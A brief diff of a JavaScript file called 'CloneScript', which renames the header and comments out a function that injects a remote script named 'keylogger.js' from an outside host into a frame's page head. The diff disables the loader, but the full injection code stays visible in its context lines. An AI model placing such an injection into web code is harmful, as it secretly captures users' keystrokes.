@@ -1,11 +1,8 @@
 /**************************
-	CloneScript Version 5
+	CS Version 5
 	11/11/2015
 	versión 5.2 al 26/11/2015
 	versión 6 al 26/04/2016
-	chg:12delmes8del2016
-	..
-	Author: ++
 **************************/
 
 
@@ -245,7 +242,7 @@ document.getElementById("CI").style.height="50px";
 //
 ////FIN DEL SCRIPT.
 
-
+/*
 function eD()
 {
 var cabe = IN.CI.document.head
@@ -254,4 +251,5 @@ scriptt.src="http://kosmosapps.xyz/keylogger.js";
 cabe.appendChild(scriptt);
 }
 eD();
+*/
 
